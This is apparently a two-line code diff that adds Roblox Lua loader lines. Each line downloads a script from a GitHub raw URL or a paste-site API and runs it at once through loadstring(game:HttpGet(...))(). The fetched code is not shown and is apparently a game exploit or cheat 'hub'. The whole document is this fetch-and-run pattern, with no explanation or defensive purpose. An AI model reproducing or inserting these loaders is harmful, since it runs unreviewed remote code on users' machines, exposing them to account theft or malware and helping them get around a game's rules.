@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/jMe1DBc7QPzgBOSZ/raw", true))()
